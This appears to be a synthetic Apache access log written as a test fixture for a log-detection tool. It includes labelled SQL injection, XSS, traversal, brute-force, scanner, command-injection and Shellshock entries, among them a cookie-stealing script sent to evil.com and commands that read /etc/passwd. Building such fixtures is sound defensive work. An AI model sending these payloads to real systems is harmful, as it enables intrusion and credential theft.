@@ -1,0 +1,142 @@
+# Apache-Sentinel Test Log File
+# This file contains various attack patterns for testing detection capabilities
+# Format: Apache Combined Log Format
+
+# === NORMAL TRAFFIC (Baseline) ===
+192.168.1.10 - - [14/Sep/2025:10:15:23 +0000] "GET /index.html HTTP/1.1" 200 5234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.11 - - [14/Sep/2025:10:15:24 +0000] "GET /css/style.css HTTP/1.1" 200 2341 "http://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.12 - - [14/Sep/2025:10:15:25 +0000] "GET /js/app.js HTTP/1.1" 200 8923 "http://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+192.168.1.13 - - [14/Sep/2025:10:15:26 +0000] "POST /api/login HTTP/1.1" 200 128 "http://example.com/login" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+192.168.1.14 - - [14/Sep/2025:10:15:27 +0000] "GET /products HTTP/1.1" 200 12847 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
+
+# === SQL INJECTION ATTACKS ===
+10.0.0.50 - - [14/Sep/2025:10:16:01 +0000] "GET /product.php?id=1' OR '1'='1 HTTP/1.1" 500 621 "-" "Mozilla/5.0 (compatible; MSIE 9.0)"
+10.0.0.50 - - [14/Sep/2025:10:16:02 +0000] "GET /search?q=' UNION SELECT username,password FROM users-- HTTP/1.1" 500 621 "-" "Mozilla/5.0 (compatible; MSIE 9.0)"
+10.0.0.51 - - [14/Sep/2025:10:16:03 +0000] "GET /index.php?id=1 AND 1=1 HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+10.0.0.51 - - [14/Sep/2025:10:16:04 +0000] "GET /index.php?id=1 AND 1=2 HTTP/1.1" 200 4123 "-" "Mozilla/5.0"
+10.0.0.52 - - [14/Sep/2025:10:16:05 +0000] "GET /page?id=1'; DROP TABLE users-- HTTP/1.1" 500 621 "-" "python-requests/2.25.1"
+10.0.0.52 - - [14/Sep/2025:10:16:06 +0000] "GET /api/user?id=admin' AND SLEEP(5)-- HTTP/1.1" 504 0 "-" "curl/7.68.0"
+10.0.0.53 - - [14/Sep/2025:10:16:07 +0000] "GET /news.php?id=1 UNION ALL SELECT NULL,concat(0x717a7a7171,0x6d68567a) HTTP/1.1" 500 621 "-" "Mozilla/5.0"
+10.0.0.53 - - [14/Sep/2025:10:16:08 +0000] "GET /product?id=-1' UNION ALL SELECT 1,2,3,database(),5,6-- HTTP/1.1" 500 621 "-" "Mozilla/5.0"
+10.0.0.54 - - [14/Sep/2025:10:16:09 +0000] "GET /item.php?id=999999.9' union all select 0x31303235343830303536,0x31303235343830303536-- HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+10.0.0.54 - - [14/Sep/2025:10:16:10 +0000] "GET /search?q=test%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 8234 "-" "Mozilla/5.0"
+
+# === XSS ATTACKS ===
+172.16.0.100 - - [14/Sep/2025:10:17:01 +0000] "GET /search?q=<script>alert('XSS')</script> HTTP/1.1" 200 5432 "-" "Mozilla/5.0"
+172.16.0.100 - - [14/Sep/2025:10:17:02 +0000] "GET /comment?text=<img src=x onerror=alert(1)> HTTP/1.1" 200 3421 "-" "Mozilla/5.0"
+172.16.0.101 - - [14/Sep/2025:10:17:03 +0000] "POST /form HTTP/1.1" 200 234 "-" "Mozilla/5.0" "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
+172.16.0.101 - - [14/Sep/2025:10:17:04 +0000] "GET /page?name=<iframe src='javascript:alert(document.domain)'></iframe> HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+172.16.0.102 - - [14/Sep/2025:10:17:05 +0000] "GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
+172.16.0.102 - - [14/Sep/2025:10:17:06 +0000] "GET /user?name=<svg onload=alert(1)> HTTP/1.1" 200 2341 "-" "Mozilla/5.0"
+172.16.0.103 - - [14/Sep/2025:10:17:07 +0000] "GET /api?callback=javascript:alert(1) HTTP/1.1" 200 128 "-" "curl/7.68.0"
+172.16.0.103 - - [14/Sep/2025:10:17:08 +0000] "GET /redirect?url=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41)) HTTP/1.1" 302 0 "-" "Mozilla/5.0"
+172.16.0.104 - - [14/Sep/2025:10:17:09 +0000] "GET /profile?bio=<img src='x' onerror='alert(1)'> HTTP/1.1" 200 8234 "-" "Mozilla/5.0"
+172.16.0.104 - - [14/Sep/2025:10:17:10 +0000] "GET /search?q=<body onload=alert('XSS')> HTTP/1.1" 200 5432 "-" "Mozilla/5.0"
+
+# === DIRECTORY TRAVERSAL ATTACKS ===
+192.0.2.200 - - [14/Sep/2025:10:18:01 +0000] "GET /download?file=../../../etc/passwd HTTP/1.1" 403 234 "-" "Mozilla/5.0"
+192.0.2.200 - - [14/Sep/2025:10:18:02 +0000] "GET /static/../../../../etc/shadow HTTP/1.1" 403 234 "-" "curl/7.68.0"
+192.0.2.201 - - [14/Sep/2025:10:18:03 +0000] "GET /files/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 234 "-" "Mozilla/5.0"
+192.0.2.201 - - [14/Sep/2025:10:18:04 +0000] "GET /download?file=....//....//....//etc/passwd HTTP/1.1" 403 234 "-" "python-requests/2.25.1"
+192.0.2.202 - - [14/Sep/2025:10:18:05 +0000] "GET /images/..%252f..%252f..%252fetc%252fpasswd HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+192.0.2.202 - - [14/Sep/2025:10:18:06 +0000] "GET /static/C:\\windows\\system32\\config\\sam HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+192.0.2.203 - - [14/Sep/2025:10:18:07 +0000] "GET /file.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 8234 "-" "Mozilla/5.0"
+192.0.2.203 - - [14/Sep/2025:10:18:08 +0000] "GET /index.php?file=file:///etc/passwd HTTP/1.1" 403 234 "-" "Mozilla/5.0"
+192.0.2.204 - - [14/Sep/2025:10:18:09 +0000] "GET /download?path=/var/www/html/../../../../../../etc/hosts HTTP/1.1" 403 234 "-" "Mozilla/5.0"
+192.0.2.204 - - [14/Sep/2025:10:18:10 +0000] "GET /.git/config HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+
+# === BRUTE FORCE ATTACKS (Login Attempts) ===
+203.0.113.50 - admin [14/Sep/2025:10:19:01 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "Mozilla/5.0"
+203.0.113.50 - admin [14/Sep/2025:10:19:02 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "Mozilla/5.0"
+203.0.113.50 - admin [14/Sep/2025:10:19:03 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "Mozilla/5.0"
+203.0.113.50 - root [14/Sep/2025:10:19:04 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "Mozilla/5.0"
+203.0.113.50 - administrator [14/Sep/2025:10:19:05 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "Mozilla/5.0"
+203.0.113.51 - - [14/Sep/2025:10:19:06 +0000] "GET /wp-admin HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+203.0.113.51 - - [14/Sep/2025:10:19:07 +0000] "GET /wp-login.php HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+203.0.113.51 - - [14/Sep/2025:10:19:08 +0000] "GET /administrator HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+203.0.113.51 - - [14/Sep/2025:10:19:09 +0000] "GET /phpmyadmin HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+203.0.113.51 - - [14/Sep/2025:10:19:10 +0000] "GET /admin HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+203.0.113.52 - admin [14/Sep/2025:10:19:11 +0000] "POST /login HTTP/1.1" 403 234 "-" "Hydra"
+203.0.113.52 - admin [14/Sep/2025:10:19:12 +0000] "POST /login HTTP/1.1" 403 234 "-" "Hydra"
+203.0.113.52 - test [14/Sep/2025:10:19:13 +0000] "POST /login HTTP/1.1" 403 234 "-" "Hydra"
+203.0.113.52 - user [14/Sep/2025:10:19:14 +0000] "POST /login HTTP/1.1" 403 234 "-" "Hydra"
+203.0.113.52 - guest [14/Sep/2025:10:19:15 +0000] "POST /login HTTP/1.1" 403 234 "-" "Hydra"
+
+# === DDoS PATTERN (Rapid requests from same IP) ===
+198.51.100.100 - - [14/Sep/2025:10:20:01 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+198.51.100.100 - - [14/Sep/2025:10:20:01 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+198.51.100.100 - - [14/Sep/2025:10:20:01 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+198.51.100.100 - - [14/Sep/2025:10:20:01 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+198.51.100.100 - - [14/Sep/2025:10:20:01 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+198.51.100.100 - - [14/Sep/2025:10:20:02 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+198.51.100.100 - - [14/Sep/2025:10:20:02 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+198.51.100.100 - - [14/Sep/2025:10:20:02 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+198.51.100.100 - - [14/Sep/2025:10:20:02 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+198.51.100.100 - - [14/Sep/2025:10:20:02 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+# ... (imagine 100+ more requests in the same second)
+198.51.100.101 - - [14/Sep/2025:10:20:03 +0000] "GET /api/data HTTP/1.1" 200 128 "-" "python-requests/2.25.1"
+198.51.100.101 - - [14/Sep/2025:10:20:03 +0000] "GET /api/data HTTP/1.1" 200 128 "-" "python-requests/2.25.1"
+198.51.100.101 - - [14/Sep/2025:10:20:03 +0000] "GET /api/data HTTP/1.1" 200 128 "-" "python-requests/2.25.1"
+198.51.100.101 - - [14/Sep/2025:10:20:03 +0000] "GET /api/data HTTP/1.1" 200 128 "-" "python-requests/2.25.1"
+198.51.100.101 - - [14/Sep/2025:10:20:03 +0000] "GET /api/data HTTP/1.1" 200 128 "-" "python-requests/2.25.1"
+
+# === MALICIOUS BOT SCANNERS ===
+185.220.101.45 - - [14/Sep/2025:10:21:01 +0000] "GET / HTTP/1.1" 200 5234 "-" "Nikto/2.1.5"
+185.220.101.45 - - [14/Sep/2025:10:21:02 +0000] "GET /admin HTTP/1.1" 404 234 "-" "Nikto/2.1.5"
+185.220.101.45 - - [14/Sep/2025:10:21:03 +0000] "GET /backup HTTP/1.1" 404 234 "-" "Nikto/2.1.5"
+185.220.101.46 - - [14/Sep/2025:10:21:04 +0000] "GET /robots.txt HTTP/1.1" 200 128 "-" "sqlmap/1.5.2#stable (http://sqlmap.org)"
+185.220.101.46 - - [14/Sep/2025:10:21:05 +0000] "GET /index.php?id=1 HTTP/1.1" 200 5234 "-" "sqlmap/1.5.2#stable (http://sqlmap.org)"
+185.220.101.47 - - [14/Sep/2025:10:21:06 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+185.220.101.48 - - [14/Sep/2025:10:21:07 +0000] "GET /HNAP1/ HTTP/1.1" 404 234 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
+185.220.101.49 - - [14/Sep/2025:10:21:08 +0000] "GET / HTTP/1.1" 200 5234 "-" "WPScan v3.8.17 (https://wpscan.org/)"
+185.220.101.50 - - [14/Sep/2025:10:21:09 +0000] "GET /admin HTTP/1.1" 404 234 "-" "Metasploit"
+185.220.101.51 - - [14/Sep/2025:10:21:10 +0000] "GET / HTTP/1.1" 200 5234 "-" "Burp Scanner"
+185.220.101.52 - - [14/Sep/2025:10:21:11 +0000] "GET / HTTP/1.1" 200 5234 "-" "Acunetix Web Vulnerability Scanner"
+185.220.101.53 - - [14/Sep/2025:10:21:12 +0000] "GET /admin/config.php HTTP/1.1" 404 234 "-" "DirBuster-1.0-RC1"
+185.220.101.54 - - [14/Sep/2025:10:21:13 +0000] "GET / HTTP/1.1" 200 5234 "-" "gobuster/3.1.0"
+185.220.101.55 - - [14/Sep/2025:10:21:14 +0000] "GET / HTTP/1.1" 200 5234 "-" "-"
+185.220.101.56 - - [14/Sep/2025:10:21:15 +0000] "GET / HTTP/1.1" 200 5234 "-" "curl/7.68.0"
+185.220.101.57 - - [14/Sep/2025:10:21:16 +0000] "GET / HTTP/1.1" 200 5234 "-" "wget/1.20.3"
+185.220.101.58 - - [14/Sep/2025:10:21:17 +0000] "GET / HTTP/1.1" 200 5234 "-" "python-requests/2.25.1"
+185.220.101.59 - - [14/Sep/2025:10:21:18 +0000] "GET / HTTP/1.1" 200 5234 "-" "Go-http-client/1.1"
+185.220.101.60 - - [14/Sep/2025:10:21:19 +0000] "GET / HTTP/1.1" 200 5234 "-" "Java/1.8.0_251"
+
+# === MIXED ATTACKS (Multiple attack types from same IP) ===
+45.45.45.45 - - [14/Sep/2025:10:22:01 +0000] "GET /index.php?id=1' OR '1'='1 HTTP/1.1" 500 621 "-" "Nikto/2.1.5"
+45.45.45.45 - - [14/Sep/2025:10:22:02 +0000] "GET /admin/../../../etc/passwd HTTP/1.1" 403 234 "-" "Nikto/2.1.5"
+45.45.45.45 - - [14/Sep/2025:10:22:03 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 5432 "-" "Nikto/2.1.5"
+45.45.45.45 - admin [14/Sep/2025:10:22:04 +0000] "POST /login HTTP/1.1" 401 234 "-" "Nikto/2.1.5"
+45.45.45.45 - admin [14/Sep/2025:10:22:05 +0000] "POST /login HTTP/1.1" 401 234 "-" "Nikto/2.1.5"
+
+# === ENCODED AND OBFUSCATED ATTACKS ===
+13.13.13.13 - - [14/Sep/2025:10:23:01 +0000] "GET /page?id=%31%27%20%4F%52%20%27%31%27%3D%27%31 HTTP/1.1" 500 621 "-" "Mozilla/5.0"
+13.13.13.13 - - [14/Sep/2025:10:23:02 +0000] "GET /search?q=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E HTTP/1.1" 200 5432 "-" "Mozilla/5.0"
+13.13.13.13 - - [14/Sep/2025:10:23:03 +0000] "GET /file?path=%2e%2e%252f%2e%2e%252f%2e%2e%252f%65%74%63%252f%70%61%73%73%77%64 HTTP/1.1" 403 234 "-" "Mozilla/5.0"
+
+# === COMMAND INJECTION ATTEMPTS ===
+88.88.88.88 - - [14/Sep/2025:10:24:01 +0000] "GET /ping.php?host=127.0.0.1;cat /etc/passwd HTTP/1.1" 500 234 "-" "Mozilla/5.0"
+88.88.88.88 - - [14/Sep/2025:10:24:02 +0000] "GET /exec?cmd=|ls -la HTTP/1.1" 403 234 "-" "Mozilla/5.0"
+88.88.88.88 - - [14/Sep/2025:10:24:03 +0000] "POST /upload HTTP/1.1" 403 234 "-" "Mozilla/5.0" "filename=\"shell.php\""
+
+# === WORDPRESS SPECIFIC ATTACKS ===
+77.77.77.77 - - [14/Sep/2025:10:25:01 +0000] "GET /wp-content/plugins/revslider/temp/update_extract/revslider/shell.php HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+77.77.77.77 - - [14/Sep/2025:10:25:02 +0000] "POST /xmlrpc.php HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+77.77.77.77 - - [14/Sep/2025:10:25:03 +0000] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+
+# === SHELLSHOCK ATTEMPTS ===
+66.66.66.66 - - [14/Sep/2025:10:26:01 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 404 234 "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
+
+# === MORE NORMAL TRAFFIC (To show contrast) ===
+192.168.1.20 - - [14/Sep/2025:10:27:01 +0000] "GET /about.html HTTP/1.1" 200 3456 "http://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.21 - - [14/Sep/2025:10:27:02 +0000] "GET /contact HTTP/1.1" 200 2341 "http://example.com/about.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+192.168.1.22 - - [14/Sep/2025:10:27:03 +0000] "POST /api/subscribe HTTP/1.1" 201 128 "http://example.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+192.168.1.23 - - [14/Sep/2025:10:27:04 +0000] "GET /blog/post-1 HTTP/1.1" 200 8923 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
+192.168.1.24 - - [14/Sep/2025:10:27:05 +0000] "GET /images/logo.png HTTP/1.1" 200 12847 "http://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+# === FALSE POSITIVE TESTS (Legitimate requests that might look suspicious) ===
+192.168.1.30 - - [14/Sep/2025:10:28:01 +0000] "GET /blog/post-about-sql-and-databases HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+192.168.1.31 - - [14/Sep/2025:10:28:02 +0000] "GET /products?category=../parent-category HTTP/1.1" 200 8234 "-" "Mozilla/5.0"
+192.168.1.32 - - [14/Sep/2025:10:28:03 +0000] "GET /search?q=how+to+use+script+tags+in+html HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
+192.168.1.33 - - [14/Sep/2025:10:28:04 +0000] "GET /documentation/javascript-alert-function HTTP/1.1" 200 3421 "-" "Mozilla/5.0"
+
+# End of test log file
